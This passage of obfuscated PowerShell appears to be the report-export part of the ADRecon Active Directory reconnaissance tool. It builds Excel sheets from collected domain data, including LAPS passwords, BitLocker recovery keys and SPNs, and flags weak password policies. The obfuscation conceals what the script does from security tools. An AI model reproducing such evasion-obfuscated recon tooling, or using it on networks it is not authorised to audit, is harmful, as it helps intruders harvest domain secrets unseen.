            ${sta`RT} = ${w`OR`KSHeeT}.("{0}{1}"-f 'Ra','nge').Invoke(${StAr`T`cOLUmn})
        }
        
        ${y} = ${W`oRks`heET}."ran`gE"(${S`TA`RT},${st`ArT}."e`Nd"(  ( get-iTEM ('V'+'ARIabLE'+':4'+'ATC')).vaLUE::"X`LD`Own"))
        ${CHa`Rt`DATA} = ${Wor`Ksh`Eet}.("{0}{1}" -f'Ra','nge').Invoke(${x},${y})

        &("{3}{1}{5}{4}{0}{2}"-f'Rele','R','ase','Get-AD','celComObj','Ex') -ComObjtoRelease ${x}
        &("{1}{2}{0}" -f 'e','Remove-Varia','bl') ('X')
        &("{3}{0}{4}{2}{1}"-f 'DRE','ObjRelease','Com','Get-A','xcel') -ComObjtoRelease ${y}
        &("{2}{1}{0}"-f 'ble','ria','Remove-Va') ('Y')
        &("{2}{0}{6}{1}{5}{4}{3}"-f'DRE','l','Get-A','e','mObjReleas','Co','xce') -ComObjtoRelease ${ST`Art}
        &("{1}{0}{2}"-f 'move-Vari','Re','able') ("{0}{1}" -f 'st','art')
    }
    ${Cha`Rt}.("{2}{0}{1}{3}"-f'r','ceD','SetSou','ata').Invoke(${c`harTD`AtA})
    
    ${C`hART}."PL`OTbY" =  $I03Vo::"x`LColU`mns"
    ${C`haRt}.("{0}{2}{1}{3}"-f'se','Colle','ries','ction').Invoke(1).("{1}{0}" -f'ct','Sele').Invoke() | &("{2}{1}{0}"-f 'ull','-N','Out')
    ${Cha`RT}.("{3}{1}{4}{0}{2}"-f'c','oll','tion','SeriesC','e').Invoke(1).("{0}{3}{2}{1}" -f 'ApplyDat','bels','La','a').Invoke() | &("{1}{0}" -f't-Null','ou')
    
    ${ch`ART}."has`TI`TLe" = ${t`RUE}
    ${C`hart}."C`HArTT`ITLE"."Te`xt" = ${CHAR`T`TItLe}
    
    ${Te`MP} = ${w`orKsHE`et}.("{1}{0}"-f 'e','Rang').Invoke(${RAnG`e`TocOV`ER})
    
    ${CHA`RT}."p`ARENT"."t`Op" = ${t`EMP}."T`oP"
    ${C`HARt}."p`A`RENT"."L`eft" = ${TE`Mp}."L`eFt"
    ${c`H`ARt}."pAR`eNt"."WId`TH" = ${Te`mP}."wiD`TH"
    If (${C`HART`TI`TLe} -ne ("{0}{3}{4}{1}{2}{5}{6}"-f'Pr','ed Grou','ps in ','i','vileg','A','D'))
    {
        ${c`hA`RT}."Pa`R`eNT"."HE`igHT" = ${t`eMP}."he`IGht"
    }
    
    ${eX`ceL}."ScrEEnu`P`dAti`NG" = ${T`RuE}
    ${E`x`CEl}."DiSP`la`yalEr`TS" = ${TR`Ue}

    &("{4}{1}{0}{3}{5}{2}" -f'xcelCom','RE','e','ObjRele','Get-AD','as') -ComObjtoRelease ${cha`Rt}
    &("{0}{1}{2}{3}" -f'R','em','ove-Vari','able') ("{1}{0}" -f'hart','c')
    &("{3}{1}{2}{4}{0}" -f'elease','o','mObj','Get-ADRExcelC','R') -ComObjtoRelease ${C`HarTDA`Ta}
    &("{2}{1}{3}{0}" -f 'e','a','Remove-V','riabl') ("{2}{0}{1}"-f'tDa','ta','Char')
    &("{3}{2}{4}{0}{5}{1}" -f 'el','omObjRelease','-AD','Get','RExc','C') -ComObjtoRelease ${te`Mp}
    &("{1}{2}{3}{0}"-f'iable','Remo','v','e-Var') ("{0}{1}"-f 't','emp')
    &("{2}{6}{7}{0}{5}{1}{4}{3}" -f 'lCo','a','Get-ADRE','e','s','mObjRele','xc','e') -ComObjtoRelease ${w`o`RkSHE`ET}
    &("{0}{4}{3}{2}{1}"-f'Rem','able','ri','-Va','ove') ("{3}{0}{2}{1}" -f's','et','he','work')
}

Function Ge`T-`A`DREXcELs`oRT
{

    param (
        [Parameter(mAndatOrY = ${t`RUE})]
        [string] ${ColU`mNN`AME}
    )

    ${WorK`she`Et} = ${w`OR`KBOok}."wor`k`SheETs".("{0}{1}" -f 'I','tem').Invoke(1)
    ${W`ORK`shEet}.("{1}{0}" -f'ivate','Act').Invoke();

    ${EX`C`ELcO`luMn} = (${w`OR`ks`hEET}."c`OLU`mNs".("{1}{0}"-f 'ind','F').Invoke(${cO`LUMNNA`mE}))
    If (${exC`ElCoL`UMN})
    {
        If (${Exc`eL`COLU`MN}."te`Xt" -ne ${CO`L`UMN`NaMe})
        {
            ${BegINaD`D`ReSs} = ${e`XC`eLcOL`UMN}.("{2}{0}{1}" -f'dd','ress','A').Invoke(0,0,1,1)
            ${e`ND} = ${F`AL`Se}
            Do {
                
                ${eXCeLCO`lU`mN} = (${W`OrkS`Heet}."CoLuM`Ns".("{1}{0}"-f'ext','FindN').Invoke(${eXCel`co`lU`MN}))
                ${A`DDr`ESs} = ${exCElCO`L`U`mn}.("{2}{0}{1}"-f'e','ss','Addr').Invoke(0,0,1,1)
                If ( (${a`DdResS} -eq ${b`EgIn`A`DDRess}) -or (${eX`ceLcolU`Mn}."T`Ext" -eq ${C`oluMNn`AME}) )
                {
                    ${e`Nd} = ${TR`UE}
                }
            } Until (${e`ND} -eq ${tR`Ue})
        }
        If (${exceL`cO`lu`mN}."TE`XT" -eq ${ColUMN`Na`ME})
        {
            
            ${Wor`KsH`eEt}."LisT`ob`jE`CtS".("{0}{1}"-f'Ite','m').Invoke(1)."s`oRT"."sO`RTFI`elDS".("{1}{0}" -f'lear','C').Invoke()
            ${W`ORksh`EET}."li`S`ToBje`CtS".("{0}{1}"-f'Ite','m').Invoke(1)."so`Rt"."Sor`TFiel`ds".("{1}{0}" -f'd','Ad').Invoke(${EXCelc`Ol`Umn}) | &("{1}{0}{2}" -f'ut','O','-Null')
            ${w`orKsHE`ET}."lI`stObj`Ects".("{1}{0}"-f 'tem','I').Invoke(1)."S`orT".("{0}{1}" -f 'Appl','y').Invoke()
        }
        Else
        {
            &("{0}{2}{3}{1}"-f'W','se','rite-Ve','rbo') "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
        }
    }
    Else
    {
        &("{2}{4}{1}{3}{0}" -f 'Verbose','te','W','-','ri') "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
    }
    &("{3}{1}{0}{2}{4}"-f'ele','jR','a','Get-ADRExcelComOb','se') -ComObjtoRelease ${wo`RKSh`eEt}
    &("{1}{4}{0}{2}{3}"-f 'ab','Remove-Va','l','e','ri') ("{1}{2}{0}" -f'et','wo','rkshe')
}

Function e`x`port-adR`eXC`El
{

    param(
        [Parameter(maNDatOry = ${tr`UE})]
        [string] ${eXCE`lPa`Th}
    )

    ${ex`C`ELPatH} = $((&("{0}{1}{2}" -f 'Convert-P','a','th') ${eX`ce`l`paTh}).("{1}{0}{2}"-f 'En','Trim','d').Invoke("\"))
    ${rE`P`oRtpATh} = -join(${e`xc`ElPAtH},'\',("{1}{2}{0}" -f's','CS','V-File'))
    If (!(&("{2}{1}{0}"-f't-Path','es','T') ${R`ePoRTP`A`Th}))
    {
        &("{1}{2}{0}"-f'ng','Write-Warn','i') ("{11}{6}{8}{16}{5}{19}{10}{3}{15}{12}{9}{1}{4}{14}{7}{2}{0}{17}{18}{13}"-f 't','s','c','o',' ','ou','ort-A','ire','DREx','e','n','[Exp','Fil','ting','d','t locate the CSV-','cel] C','ory ...',' Exi','ld ')
        &("{0}{1}{3}{2}"-f 'Writ','e','se','-Verbo') "[EXCEPTION] $($_.Exception.Message) "
        Return ${N`Ull}
    }
    &("{1}{4}{2}{3}{0}"-f'mObj','Get-A','lC','o','DRExce')
    If (${ex`Cel})
    {
        &("{1}{2}{0}{3}"-f'Ou','W','rite-','tput') ("{0}{3}{2}{5}{4}{1}"-f'[*] ','g ADRecon-Report.xlsx','en','G','tin','era')

        ${adFILE`N`A`ME} = -join(${RePor`T`PaTh},'\',("{0}{2}{1}" -f'AboutA','n.csv','DReco'))
        If (&("{0}{2}{1}" -f'Tes','Path','t-') ${a`dfi`lE`NAmE})
        {
            &("{0}{3}{1}{2}" -f'Get-ADREx','por','t','celIm') -ADFileName ${Ad`FILE`NamE}
            &("{0}{4}{3}{2}{1}" -f'Remo','e','abl','ari','ve-V') ("{1}{0}{2}"-f'ileNa','ADF','me')

            ${Wor`KBO`ok}."WoRKsh`Ee`TS".("{1}{0}"-f'm','Ite').Invoke(1)."N`AME" = ("{1}{0}{2}{3}" -f'out ','Ab','A','DRecon')
            ${woR`kbooK}."wOrkSh`EE`TS".("{0}{1}" -f'I','tem').Invoke(1)."hYpe`Rli`NkS".("{0}{1}"-f'Ad','d').Invoke(${wOrK`Bo`Ok}."wOR`K`ShEE`Ts".("{1}{0}" -f 'em','It').Invoke(1)."cEl`lS".("{1}{0}" -f 'm','Ite').Invoke(3,2) , ("{3}{6}{4}{1}{5}{2}{0}"-f 'DRecon','github.c','con/A','htt','://','om/adre','ps'), "" , "", ("{4}{1}{2}{5}{0}{3}" -f 'Rec','ithu','b.com','on','g','/adrecon/AD')) | &("{0}{2}{1}"-f'Out','ll','-Nu')
            ${w`ORKBo`Ok}."W`ORKsH`eEts".("{1}{0}" -f'm','Ite').Invoke(1)."U`SEd`RanGE"."eN`TI`RE`colUMn".("{2}{0}{1}" -f 'toF','it','Au').Invoke() | &("{1}{0}{2}"-f 't-Nu','Ou','ll')
        }

        ${A`dfIL`En`Ame} = -join(${RepoR`T`PaTh},'\',("{3}{0}{2}{1}" -f 'ores','sv','t.c','F'))
        If (&("{0}{1}" -f 'Test','-Path') ${AD`FIlEN`A`Me})
        {
            &("{1}{3}{4}{2}{0}{5}{6}" -f 'ork','Get-A','elW','DR','Exc','bo','ok') -Name ("{0}{1}" -f 'F','orest')
            &("{2}{4}{3}{1}{0}"-f'elImport','c','Get','ADREx','-') -ADFileName ${Ad`FIle`N`AME}
            &("{3}{0}{4}{1}{2}"-f'-Va','ab','le','Remove','ri') ("{1}{2}{0}"-f 'me','ADFile','Na')
        }

        ${A`D`FI`lEname} = -join(${re`PoRtP`ATh},'\',("{2}{0}{1}" -f'i','n.csv','Doma'))
        If (&("{1}{2}{0}"-f'ath','Test','-P') ${ad`FILe`NAmE})
        {
            &("{5}{1}{0}{4}{2}{3}"-f'lW','ADRExce','k','book','or','Get-') -Name ("{0}{1}" -f 'Dom','ain')
            &("{1}{3}{2}{0}"-f'Import','G','el','et-ADRExc') -ADFileName ${aD`F`I`lEnAmE}
            ${dO`mA`INobj} = &("{1}{2}{0}"-f 'port-CSV','I','m') -Path ${aDfi`lenA`Me}
            &("{1}{0}{2}" -f'mo','Re','ve-Variable') ("{1}{2}{0}"-f'ame','AD','FileN')
            ${D`oMAIn`N`AMe} = -join(${D`OmAi`N`OBj}[0]."VA`LUe","-")
            &("{1}{3}{2}{0}" -f 'e','Remove','ariabl','-V') ("{1}{0}{2}" -f'mai','Do','nObj')
        }

        ${A`DfiLen`A`me} = -join(${REPORt`pa`Th},'\',("{0}{2}{1}"-f 'Trus','v','ts.cs'))
        If (&("{0}{1}" -f 'Test-Pat','h') ${ad`FILe`N`AMe})
        {
            &("{6}{5}{2}{1}{4}{3}{0}"-f 'ook','cel','x','kb','Wor','E','Get-ADR') -Name ("{1}{0}"-f 'sts','Tru')
            &("{3}{4}{1}{2}{0}" -f'ort','RExce','lImp','Get-A','D') -ADFileName ${A`Df`Il`eNAME}
            &("{3}{2}{1}{0}"-f'able','i','r','Remove-Va') ("{0}{2}{1}" -f 'A','ileName','DF')
        }

        ${adfiL`e`Name} = -join(${repo`RTpA`Th},'\',("{0}{3}{2}{1}"-f 'Sub','csv','.','nets'))
        If (&("{2}{0}{1}" -f't-Pat','h','Tes') ${AdFI`len`A`mE})
        {
            &("{3}{2}{0}{1}"-f'lWo','rkbook','ce','Get-ADREx') -Name ("{2}{1}{0}"-f'ts','ubne','S')
            &("{0}{3}{4}{2}{1}" -f'Get','t','Impor','-ADR','Excel') -ADFileName ${a`DF`ilE`NAmE}
            &("{2}{3}{4}{0}{1}"-f'ar','iable','Rem','ove-','V') ("{2}{0}{1}"-f 'ileNam','e','ADF')
        }

        ${aDFI`L`eNaMe} = -join(${R`e`Por`TpAtH},'\',("{0}{1}{2}"-f 'Sit','es','.csv'))
        If (&("{0}{1}" -f'Test-Pa','th') ${aDFI`leNA`me})
        {
            &("{1}{3}{0}{2}"-f'R','Get-','ExcelWorkbook','AD') -Name ("{1}{0}"-f 'tes','Si')
            &("{2}{4}{3}{0}{1}" -f 'celImpor','t','G','ADREx','et-') -ADFileName ${ADF`ilE`N`AMe}
            &("{0}{2}{3}{1}"-f'Remo','le','ve-Va','riab') ("{1}{0}{2}"-f'leNa','ADFi','me')
        }

        ${AdFI`Len`AMe} = -join(${rEpOR`Tp`Ath},'\',("{3}{2}{0}{4}{1}" -f 'Histo','sv','ma','Sche','ry.c'))
        If (&("{0}{1}" -f'Te','st-Path') ${aDFIl`eNa`Me})
        {
            &("{1}{2}{0}{3}"-f'-ADRExc','Ge','t','elWorkbook') -Name ("{2}{3}{0}{1}" -f'Hi','story','Sc','hema')
            &("{2}{4}{1}{5}{3}{0}" -f'ort','DRExcel','G','p','et-A','Im') -ADFileName ${A`df`IlE`NaME}
            &("{0}{3}{2}{4}{1}"-f'Rem','-Variable','v','o','e') ("{0}{1}{2}" -f 'ADFi','leN','ame')
        }

        ${a`DFi`leN`AmE} = -join(${RePO`R`TpA`Th},'\',("{7}{1}{6}{5}{0}{4}{3}{2}" -f'as','in','v','rdPolicy.cs','swo','nedP','eGrai','F'))
        If (&("{2}{0}{1}{3}"-f'es','t-P','T','ath') ${A`Df`iLeNAmE})
        {
            &("{1}{0}{5}{2}{3}{4}" -f 'et-A','G','RExc','elWo','rkbook','D') -Name ("{5}{1}{4}{2}{7}{3}{6}{0}"-f'olicy','in','ained Pa','d ','e Gr','F','P','sswor')
            &("{4}{0}{3}{2}{1}"-f 'et-ADRE','lImport','e','xc','G') -ADFileName ${A`d`FIlENa`me}
            &("{0}{1}{3}{2}" -f 'Remove-V','ar','able','i') ("{2}{0}{1}"-f'a','me','ADFileN')
        }

        ${a`DFiLE`Na`me} = -join(${RePORT`P`ATh},'\',("{3}{0}{5}{1}{4}{2}" -f 'a','s','licy.csv','Def','swordPo','ultPa'))
        If (&("{2}{1}{0}" -f'-Path','est','T') ${ADf`i`LENa`mE})
        {
            &("{1}{2}{4}{0}{3}{5}"-f 'lW','Get-AD','RExc','ork','e','book') -Name ("{4}{2}{5}{3}{0}{1}" -f'd Polic','y','u','Passwor','Defa','lt ')
            &("{2}{1}{4}{5}{0}{3}"-f 'elImpo','et','G','rt','-A','DRExc') -ADFileName ${A`DfILenA`Me}
            &("{2}{1}{0}"-f'riable','a','Remove-V') ("{1}{0}{2}"-f 'File','AD','Name')

            ${e`xceL}."Sc`ReeN`Up`dAT`InG" = ${Fa`lse}
            ${workSH`e`ET} = ${w`oR`KbOoK}."Wo`R`KshEETs".("{0}{1}" -f 'Ite','m').Invoke(1)
            
            ${woR`kSH`eET}.("{0}{1}" -f 'Rang','e').Invoke(("{2}{0}{1}" -f'2:','G10','B'))."hORIzo`NT`A`l`AligNMeNT" = -4108
            

            ("{1}{0}" -f'B10','A2:'), ("{2}{1}{0}" -f '0',':D1','C2'), ("{0}{1}{2}"-f'E2',':F','10'), ("{0}{1}"-f'G2',':G10') | &("{1}{0}{2}{4}{3}"-f 'h','ForEac','-Obj','t','ec') {
                ${W`o`RKSH`eet}.("{1}{0}"-f 'e','Rang').Invoke(${_}).("{2}{0}{3}{1}" -f 'or','ound','B','derAr').Invoke(1) | &("{0}{2}{1}" -f'O','t-Null','u')
            }

            
            
            
            

            ${OBJV`Al`UeS} = @(
            
            "C2", ("{1}{2}{0}{3}{4}" -f'TRUE, ','=I','F(B2<4,','F','ALSE)')

            
            "C3", (("{1}{6}{0}{5}{4}{3}{2}"-f'OR(B','=I','),TRUE, FALSE)','3>90','B','3=0,','F('))

            

            
            "C5", ("{4}{1}{0}{2}{3}{5}"-f'B5<7,','IF(','TRUE, ','FA','=','LSE)')

            
            "C6", ("{2}{5}{4}{0}{1}{3}{6}"-f 'E,','TRU','=IF','E, ','B6<>TRU','(','FALSE)')

            

            
            "C8", ("{8}{2}{4}{3}{5}{0}{1}{6}{7}{9}" -f'TRUE, F','A','(AND(','1,B','B8>=','8<30),','L','SE','=IF',')')

            
            "C9", (("{5}{2}{0}{1}{4}{3}" -f'>6),TRU','E','OR(B9=0,B9','ALSE)',', F','=IF('))

            

            
            "E2", ("{3}{4}{1}{0}{2}{5}" -f 'TRU','<8,','E, F','=IF','(B2','ALSE)')

            
            "E3", ("{4}{2}{0}{3}{5}{8}{9}{6}{7}{1}" -f 'F(',')','I','OR(','=','B3=',',',' FALSE','0,B3>90','),TRUE')

            
            "E4", ("{0}{4}{1}{5}{3}{2}"-f '=','F(B4=',' FALSE)','RUE,','I','0,T')

            
            "E5", ("{3}{1}{0}{2}{6}{4}{5}"-f'E','RU',', F','=IF(B5<13,T','E',')','ALS')

            
            "E6", (("{5}{4}{6}{2}{0}{3}{1}"-f 'E, FA',')','RU','LSE','F(B6<>TRUE,','=I','T'))

            

            

            
            "E9", (("{6}{1}{7}{4}{3}{8}{5}{2}{0}"-f'E)','IF','LS','9>','R(B9=0,B','E, FA','=','(O','5),TRU'))

            

            
            "G2", (("{0}{3}{1}{4}{2}" -f '=IF','2<24,TRUE,','LSE)','(B',' FA'))

            
            "G3", ("{0}{4}{2}{6}{5}{1}{7}{3}" -f '=IF(OR(','E','3=0','E)','B','3>60),TRU',',B',', FALS')

            
            "G4", ("{3}{0}{1}{2}{4}" -f '=0,T','RU','E, F','=IF(B4','ALSE)')

            
            "G5", (("{3}{5}{6}{1}{0}{4}{2}"-f' F',',','SE)','=','AL','IF(B','5<14,TRUE'))

            
            "G6", (("{3}{4}{2}{1}{0}" -f'LSE)','TRUE, FA','RUE,','=IF(B6<','>T'))

            
            "G7", (("{3}{6}{5}{4}{0}{2}{1}"-f'FAL','TRUE, FALSE)','SE,','=IF','>','<','(B7'))

            
            "G8", (("{0}{3}{1}{8}{9}{7}{5}{4}{2}{6}" -f'=I','(A','E','F','S',',TRUE, FAL',')','5)','ND(B8>','=1,B8<1'))

            
            "G9", ("{1}{2}{6}{4}{0}{3}{5}" -f',B9>','=I','F(O','10),TRUE, FA','(B9=0','LSE)','R')

            
            "G10", (("{0}{3}{2}{1}" -f '=IF','ALSE)','RUE, F','(B10<15,T')) )

            For (${I} = 0; ${I} -lt $(${objvA`L`UES}."C`oUNt"); ${i}++)
            {
                ${wo`RKS`hEEt}."RA`NGe"(${obJva`L`UeS}[${i}])."f`OrMAt`Con`diTi`ONs"."A`Dd"( (  GEt-CHiLditEm vArIable:608G ).ValUe::"x`lexprE`s`sion", 0, ${Ob`JvAL`UEs}[${i}+1]) | &("{1}{0}" -f'l','Out-Nul')
                ${I}++
            }

            "C2", "C3" , "C5", "C6", "C8", "C9", "E2", "E3" , "E4", "E5", "E6", "E9", "G2", "G3", "G4", "G5", "G6", "G7", "G8", "G9", "G10" | &("{0}{1}{2}" -f 'For','Each-O','bject') {
                ${WOR`Ks`hEEt}.("{0}{1}" -f 'Ra','nge').Invoke(${_})."fo`RmATcO`NDI`TioNs".("{0}{1}"-f 'I','tem').Invoke(1)."s`TOpIf`T`RUe" = ${f`ALse}
                ${w`O`RkSH`eeT}.("{0}{1}"-f'R','ange').Invoke(${_})."Fo`RmAT`cOND`iT`Ions".("{0}{1}" -f 'I','tem').Invoke(1)."fo`NT"."cOlo`Ri`NDex" = 3
            }

            ${work`B`oOk}."WOrkS`He`ETS".("{0}{1}"-f'I','tem').Invoke(1)."hyp`Erl`inkS".("{1}{0}" -f 'd','Ad').Invoke(${wO`R`KBOOk}."wo`Rk`SHEeTS".("{1}{0}"-f'tem','I').Invoke(1)."CEL`LS".("{1}{0}" -f 'm','Ite').Invoke(1,4) , ("{13}{3}{12}{11}{18}{9}{17}{20}{10}{0}{19}{14}{16}{1}{2}{6}{15}{7}{4}{8}{21}{5}" -f 'ards.org/','?','categ','ttps','d','t=pci_dss','o','=pcidss&','oc','sec','d','/',':/','h','_li','ry','brary','u','www.pci','document','ritystan','umen'), "" , "", ("{2}{1}{3}{0}" -f '.1','I','PC',' DSS v3.2')) | &("{2}{1}{0}"-f 'll','ut-Nu','O')
            ${w`ORK`BOoK}."W`o`RKsHeEts".("{1}{0}"-f'm','Ite').Invoke(1)."hyPeR`L`InkS".("{1}{0}" -f'dd','A').Invoke(${Wor`Kb`oOK}."WOr`k`sHeEtS".("{1}{0}" -f 'm','Ite').Invoke(1)."cel`ls".("{1}{0}"-f 'm','Ite').Invoke(1,6) , ("{8}{7}{6}{1}{3}{0}{4}{2}{5}" -f'.gov.au/i','//a','osec/i','csc','nf','sm/',':','tps','ht'), "" , "", ("{3}{4}{5}{1}{2}{0}"-f'ls','tr','o','2','018 ISM ','Con')) | &("{0}{2}{1}" -f'Out-','ll','Nu')
            ${Wo`RK`BOOK}."woRK`s`heEtS".("{1}{0}"-f 'm','Ite').Invoke(1)."hYPE`RL`iNks".("{1}{0}" -f'dd','A').Invoke(${wo`R`KBO`Ok}."w`orks`H`eETs".("{0}{1}" -f 'It','em').Invoke(1)."CEL`Ls".("{1}{0}" -f 'm','Ite').Invoke(1,7) , ("{6}{12}{5}{11}{7}{0}{4}{1}{8}{10}{2}{3}{9}"-f'ar','c','dows_','serv','k/mi','://www.cisecuri','ht','org/benchm','rosoft_wi','er/','n','ty.','tps'), "" , "", ("{4}{3}{0}{1}{2}"-f'k ','2','016','ar','CIS Benchm')) | &("{1}{2}{0}" -f'ull','O','ut-N')

            ${Ex`Cel}."scREe`N`UpDATIng" = ${T`Rue}
            &("{4}{1}{2}{0}{3}" -f'mO','et-ADRExcel','Co','bjRelease','G') -ComObjtoRelease ${woRk`s`hEeT}
            &("{0}{2}{1}{4}{3}" -f 'Remo','ari','ve-V','e','abl') ("{0}{2}{1}" -f 'wo','et','rkshe')
        }

        ${aDF`ILen`AME} = -join(${R`epo`RtPa`Th},'\',("{2}{4}{5}{0}{1}{3}"-f 'inCo','ntroll','D','ers.csv','o','ma'))
        If (&("{0}{2}{1}"-f 'Tes','-Path','t') ${AD`F`ileN`Ame})
        {
            &("{5}{2}{6}{1}{0}{4}{3}" -f 'RExcelWorkb','AD','e','k','oo','G','t-') -Name ("{0}{4}{1}{2}{3}"-f'Domain Co','ll','e','rs','ntro')
            &("{1}{3}{4}{2}{0}" -f 'port','Ge','celIm','t-ADRE','x') -ADFileName ${AD`FiL`eNA`Me}
            &("{0}{2}{1}" -f'Remove-Va','e','riabl') ("{1}{0}{2}"-f'am','ADFileN','e')
        }

        ${adFILe`Na`mE} = -join(${rEP`oR`TPatH},'\',("{1}{2}{0}{4}{3}" -f'h','Group','C','sv','anges.c'))
        If (&("{2}{0}{1}"-f '-P','ath','Test') ${AdF`iLeN`A`mE})
        {
            &("{1}{0}{3}{2}{4}{5}" -f 't-AD','Ge','ce','REx','lWorkboo','k') -Name ("{0}{2}{1}{3}" -f 'Grou','Chang','p ','es')
            &("{0}{3}{2}{1}"-f'Get','ort','RExcelImp','-AD') -ADFileName ${aD`F`ileNAme}
            &("{0}{2}{1}" -f'Remove-','riable','Va') ("{1}{0}{2}" -f'ileN','ADF','ame')

            &("{4}{0}{1}{5}{2}{3}"-f't-','ADRE','elS','ort','Ge','xc') -ColumnName ("{2}{0}{1}" -f 'up ','Name','Gro')
        }

        ${a`dFiL`ENa`mE} = -join(${REPOr`T`PATh},'\',("{1}{0}{2}"-f 'Ls.c','DAC','sv'))
        If (&("{2}{0}{1}" -f'est-','Path','T') ${Ad`FI`LenA`Me})
        {
            &("{1}{4}{2}{3}{0}"-f'ok','Get-AD','xcelW','orkbo','RE') -Name ("{1}{0}"-f 'CLs','DA')
            &("{3}{0}{4}{2}{1}" -f'et','rt','RExcelImpo','G','-AD') -ADFileName ${adF`IL`E`NAMe}
            &("{0}{3}{2}{4}{1}"-f 'Re','ble','ove-V','m','aria') ("{2}{0}{1}" -f 'FileNa','me','AD')
        }

        ${aD`F`ILEN`AMe} = -join(${R`e`PoRTP`Ath},'\',("{2}{1}{0}{3}"-f'Ls','C','SA','.csv'))
        If (&("{2}{0}{1}"-f 't-','Path','Tes') ${aDf`i`lENAMe})
        {
            &("{2}{3}{1}{0}{4}"-f'k','RExcelWor','Ge','t-AD','book') -Name ("{0}{1}" -f'SACL','s')
            &("{2}{4}{0}{1}{3}" -f'R','Excel','Ge','Import','t-AD') -ADFileName ${aDfIlen`A`Me}
            &("{0}{1}{3}{2}" -f'Remo','ve-Var','e','iabl') ("{0}{1}{2}" -f 'ADFileN','a','me')
        }

        ${a`dFiLE`Na`mE} = -join(${R`ePo`RtpA`Th},'\',("{2}{1}{0}" -f'v','s.cs','GPO'))
        If (&("{1}{2}{0}"-f'h','Te','st-Pat') ${aD`FiL`ename})
        {
            &("{5}{3}{1}{0}{4}{2}{6}"-f 'x','E','Wo','DR','cel','Get-A','rkbook') -Name ("{0}{1}" -f 'G','POs')
            &("{0}{4}{3}{1}{2}{5}" -f 'G','Exce','l','t-ADR','e','Import') -ADFileName ${aD`FilE`N`AME}
            &("{4}{3}{2}{0}{1}" -f '-Var','iable','ve','mo','Re') ("{2}{1}{0}"-f 'leName','i','ADF')
        }

        ${ADF`ILEn`AME} = -join(${rEPo`RTPa`TH},'\',("{0}{1}{2}"-f 'g','PLinks.cs','v'))
        If (&("{0}{1}" -f'T','est-Path') ${A`D`Fi`lEnaMe})
        {
            &("{2}{0}{1}{3}"-f'celWork','bo','Get-ADREx','ok') -Name ("{0}{1}"-f 'g','PLinks')
            &("{0}{2}{3}{1}{4}"-f 'Ge','xce','t','-ADRE','lImport') -ADFileName ${ad`F`ILENAme}
            &("{1}{4}{0}{3}{2}"-f 'e','Re','able','-Vari','mov') ("{2}{0}{1}" -f'eNa','me','ADFil')
        }

        ${A`DFilE`NAME} = -join(${RePOr`TP`A`Th},'\',("{1}{0}{2}" -f 'SN','DN','odes'),("{1}{0}" -f'sv','.c'))
        If (&("{2}{1}{0}{3}"-f 't','est-Pa','T','h') ${A`DFil`EnAMe})
        {
            &("{3}{1}{0}{2}" -f'celWorkbo','-ADREx','ok','Get') -Name ("{1}{2}{0}" -f 'ds','DN','S Recor')
            &("{3}{4}{2}{0}{1}{5}" -f 'el','I','c','Ge','t-ADREx','mport') -ADFileName ${A`DFIlE`Na`ME}
            &("{2}{3}{0}{1}" -f 'a','ble','R','emove-Vari') ("{0}{2}{1}" -f 'ADFi','e','leNam')
        }

        ${a`dFiLen`A`ME} = -join(${Re`pOrTPa`Th},'\',("{3}{0}{1}{2}" -f 'Zon','es.cs','v','DNS'))
        If (&("{1}{0}{2}" -f 'est-Pa','T','th') ${aDf`i`lEnaMe})
        {
            &("{4}{5}{3}{6}{2}{0}{1}"-f'oo','k','kb','ADREx','Ge','t-','celWor') -Name ("{0}{2}{1}"-f 'DNS Z','s','one')
            &("{2}{1}{4}{3}{0}"-f 'ort','e','G','elImp','t-ADRExc') -ADFileName ${a`dF`iLE`NAme}
            &("{4}{0}{3}{1}{2}"-f've-','riab','le','Va','Remo') ("{0}{2}{1}" -f'ADFi','eName','l')
        }

        ${AD`F`IlEn`AMe} = -join(${rE`p`O`RTPaTH},'\',("{3}{2}{0}{1}" -f 's','.csv','r','Printe'))
        If (&("{2}{0}{1}" -f'est','-Path','T') ${Ad`FIL`en`AME})
        {
            &("{5}{3}{0}{1}{4}{2}"-f'xcel','Wor','ok','ADRE','kbo','Get-') -Name ("{1}{0}" -f 'ers','Print')
            &("{4}{1}{2}{3}{0}" -f'rt','-','ADRExce','lImpo','Get') -ADFileName ${adf`ilE`Na`ME}
            &("{1}{3}{2}{0}{4}"-f 'l','Remove-','ariab','V','e') ("{2}{0}{1}"-f 'File','Name','AD')
        }

        ${A`dFI`LenAMe} = -join(${RePOrT`pA`Th},'\',("{3}{0}{2}{1}{4}{5}"-f 'itLockerR','Key','ecovery','B','s.c','sv'))
        If (&("{2}{0}{1}"-f's','t-Path','Te') ${ADf`IL`E`NaMe})
        {
            &("{0}{4}{5}{2}{3}{1}" -f 'G','k','xc','elWorkboo','et-','ADRE') -Name ("{2}{1}{0}"-f 'r','e','BitLock')
            &("{2}{3}{4}{0}{1}" -f 'c','elImport','Get-','A','DREx') -ADFileName ${A`DFi`LeN`AME}
            &("{1}{2}{3}{0}"-f'e','R','e','move-Variabl') ("{1}{0}{2}"-f 'Na','ADFile','me')
        }

        ${a`dFil`enAmE} = -join(${R`Epo`Rt`pATh},'\',("{1}{0}{2}"-f'A','L','PS.csv'))
        If (&("{2}{1}{0}" -f'ath','st-P','Te') ${Ad`FI`lENA`me})
        {
            &("{2}{0}{1}{4}{3}" -f 'RExce','lWor','Get-AD','k','kboo') -Name ("{1}{0}"-f'PS','LA')
            &("{1}{3}{2}{0}{4}"-f 'ExcelI','Get-A','R','D','mport') -ADFileName ${AdF`IlE`NAmE}
            &("{3}{2}{1}{0}" -f'le','ariab','move-V','Re') ("{3}{2}{0}{1}"-f'eNa','me','DFil','A')
        }

        ${ad`FiLE`NAme} = -join(${RePO`R`T`pAtH},'\',("{2}{0}{1}{3}"-f'te','r','Compu','SPNs.csv'))
        If (&("{0}{1}"-f 'Test','-Path') ${aDFIL`eN`A`me})
        {
            &("{4}{0}{1}{2}{5}{3}" -f 'A','D','RExcelW','rkbook','Get-','o') -Name ("{2}{3}{0}{1}" -f 'r SPN','s','Comput','e')
            &("{5}{4}{3}{1}{0}{2}"-f'Im','l','port','xce','t-ADRE','Ge') -ADFileName ${ad`FI`LEN`AME}
            &("{1}{2}{3}{0}"-f 'ble','R','emov','e-Varia') ("{1}{3}{2}{0}" -f'e','ADF','am','ileN')

